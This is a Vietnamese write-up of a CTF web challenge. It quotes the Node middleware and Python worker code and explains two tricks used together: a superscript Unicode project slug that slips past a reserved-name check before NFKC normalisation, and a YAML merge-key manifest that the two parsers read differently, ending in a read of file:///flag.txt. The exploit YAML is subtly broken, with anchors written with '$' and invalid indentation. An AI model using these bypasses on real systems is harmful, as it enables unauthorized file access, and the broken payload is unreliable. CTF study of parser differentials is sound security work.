# Tổng quan
Mô tả: I wonder why Egyptian food has so much Zebda. They say the Zebda is what makes the food bypass your stomach and go straight to your heart. The kitchen just opened; grab a plate while it's still warm.\
Nhận xét: Bài gồm các service như `middleware` `worker` `nginx`. Luồng hoạt động của challenge như sau

```mermaid
    flowchart LR
        A[nginx] --> B[middleware]
        B --> C[worker]
```
Các endpoint bao gồm: `/health` `/api/project` `/api/projects/:projectId` `/api/projects/:projectId/builds` `/api/builds/:buildId`.\
Chức năng chính bao gồm: Tạo project slug và thực hiện run build dựa trên project id. 


Flag được gọi đến trong hàm `import_bundle` trong `app.py` của service `worker` khi `source: file:///flag.txt`
```python
def import_bundle(source):
    parsed = urlsplit(source)
    if parsed.scheme != "file":
        raise PermissionError("Invalid scheme")
    if parsed.netloc != "":
        raise PermissionError("Invalid file host")
    if parsed.path != "/flag.txt":
        raise PermissionError("Unknown internal bundle")
    if parsed.query or parsed.fragment:
        raise PermissionError("Invalid internal bundle")
    return Path(FLAG_PATH).read_text(encoding="utf-8").strip()
```

# Phân tích
```python
@app.post("/run")
def run():
    payload = request.get_json(silent=True)
    if not isinstance(payload, dict):
        return jsonify(ok=False, error="Invalid request"), 400

    raw_slug = payload.get("slug")
    raw_manifest = payload.get("manifest")
    if not isinstance(raw_slug, str) or not isinstance(raw_manifest, str):
        return jsonify(ok=False, error="Invalid request"), 400
    if len(raw_manifest.encode("utf-8")) > MAX_MANIFEST_BYTES:
        return jsonify(ok=False, error="Manifest too large"), 413

    allowed_actions = POLICIES[select_policy(raw_slug)]

    try:
        manifest = yaml.safe_load(raw_manifest)
    except yaml.YAMLError:
        return jsonify(ok=False, error="Manifest could not be parsed"), 400

    if not isinstance(manifest, dict) or not isinstance(manifest.get("job"), dict):
        return jsonify(ok=False, error="Manifest must contain a job"), 400

    job = manifest["job"]
    action = job.get("action")
    source = job.get("source")
    if not isinstance(action, str) or not isinstance(source, str):
        return jsonify(ok=False, error="Invalid job"), 400

    if action not in allowed_actions:
        return jsonify(ok=False, error="Action not allowed"), 403

    try:
        if action == "translate":
            artifact = translate(source)
        elif action == "import":
            artifact = import_bundle(source)
        else:
            return jsonify(ok=False, error="Unsupported action"), 400
    except PermissionError as exc:
        return jsonify(ok=False, error=str(exc)), 403
    except OSError:
        return jsonify(ok=False, error="Bundle unavailable"), 500

    return jsonify(ok=True, artifact=artifact)
```
Bên trên là đoạn code của route `/run`, để gọi được hàm `import_bundle()` nó yêu cầu như sau:
- Nội dung của YAML manifest: 
```yaml
job:
    action:
    source: 
```
- Action phải là `import`, Để làm được điều này thì cần thông qua cơ chế kiểm tra(func canonicalize_slug() ) dựa trên `slug`(tên project):
```python
 POLICIES = {
    "standard": {"translate"},
    "system": {"translate", "import"},
}
``` 
Tiếp theo mình sẽ phân tích cơ chế hoạt động của hàm chuẩn hóa `canonicalize_slug()`:
```python
def canonicalize_slug(raw_slug):
    return unicodedata.normalize("NFKC", raw_slug).casefold()
```
Hàm trên thực hiện chuẩn hóa unicode chuỗi `raw_slug` theo chuẩn  `NFKC` sau đó sẽ thực hiện chuyển chuỗi đã chuyển sang dạng không phân biệt hoa/thường.
Ngoài ra, ở service `middleware` có kiểm tra chuỗi `raw_slug` bằng hàm `isReservedProjectName()`. Hàm dưới sẽ kiểm tra chuỗi `slug` là `system` or `admin` thì không tạo được project.
```python
function isReservedProjectName(slug) {
  return reservedNames.has(slug.toLowerCase());
}
.....
if (isReservedProjectName(slug)) {
    return res.status(403).json({ error: 'Reserved project name' });
  }
```

Ngoài việc kiểm tra tên `slug` của project. Service middleware còn kiểm tra nội dung `manifest` nếu không chứa `job` và action trong `job` khác `translate` thì báo lỗi.
```python
function validateManifest(manifest) {
  if (!manifest || typeof manifest !== 'object' || Array.isArray(manifest)) {
    throw new Error('Manifest must be an object');
  }
  if (!manifest.job || typeof manifest.job !== 'object') {
    throw new Error('Manifest must contain a job');
  }
  if (manifest.job.action !== 'translate') {
    throw new Error('Unsupported action');
  }
  if (typeof manifest.job.source !== 'string') {
    throw new Error('Source must be a string');
  }

  let sourceUrl;
  try {
    sourceUrl = new URL(manifest.job.source);
  } catch {
    throw new Error('Source must be a valid URL');
  }
  if (sourceUrl.protocol !== 'https:') {
    throw new Error('Only HTTPS sources are allowed');
  }
}
```

--> Mục tiêu: Tạo `slug` là system để action là import từ đó gọi hàm import_bundle() lấy Flag . Lỗ hổng xảy ra trong bài trên là sự khác biệt trong việc xử lý chuỗi của `toLowerCase()` `casefold()`, quá trình chuẩn hóa dữ liệu `NFKC`và sự kiểm tra lỏng lẻo `manifest` trong hàm `validateManifest`.
# Quá trình khai thác

1.Tạo project với slug là chuỗi kí tự superscript (ˢʸˢᵗᵉᵐ), việc này sẽ bypass được sự kiểm tra của middleware và khi vào worker sẽ được chuyển thành `system` để gán `action: import`

![](image1.png) 

2.Vì `middleware` gọi js-yaml parse rawmanifest nhưng không gửi bản đã validate sang `worker` parse mà lại gửi bản rawmanifest. Vậy nên mình sẽ gửi bản manifest sạch trước rồi sau đó gửi payload phía sau .

```yaml
tung2: $tung2
    action: translate
    source: https://example.com/dictionary.json
tung1: $tung1
    action: import
    source: file:///flag.txt
job:
    <<:*tung2
    <<:*tung1
```

![](image2.png)
# FLAG
~~`L3AK{Parsers_T4$TE_th!ng$_diFFerently_Just_l!ke_Zebda}`~~

